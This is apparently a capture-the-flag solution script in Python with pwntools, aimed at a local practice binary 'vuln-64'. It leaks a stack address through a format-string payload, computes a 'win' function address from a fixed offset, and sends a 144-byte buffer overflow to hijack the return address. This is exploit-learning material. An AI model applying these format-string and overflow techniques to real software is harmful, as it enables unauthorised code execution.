from pwn import *

context(os='linux', arch='amd64')
io=process('./vuln-64')

io.sendline(b'%11$p') #fill in 00 to find ret addy in stack
ret_addr = int(io.recvline(),16)

win = ret_addr - 331 #fill in w difference between ret_addr and win function

oflow = b'A' * 144

exploit = bytearray(oflow)
exploit.extend(win.to_bytes(8, byteorder='little'))


io.recvline()
io.recvline()


io.sendline(exploit)

print('buff: ', io.recvline())

print('output: ', io.recvline())

io.close()